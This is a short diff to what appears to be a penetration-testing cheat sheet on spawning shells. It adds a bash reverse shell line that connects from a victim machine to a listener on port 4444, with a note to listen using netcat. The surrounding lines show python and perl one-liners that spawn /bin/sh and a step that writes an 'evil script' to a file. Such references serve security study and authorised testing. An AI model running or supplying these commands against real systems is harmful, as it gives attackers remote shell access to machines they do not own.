@@ -59,8 +59,7 @@ echo "evil script code" | tee script.sh
 // tee -a to append at the end of the file
 
 == Spawn a shell with a programming language ==
-Try invoking a SHELL through your favorite language:
-
+bash -i >& /dev/tcp/192.168.31.139/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
 python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
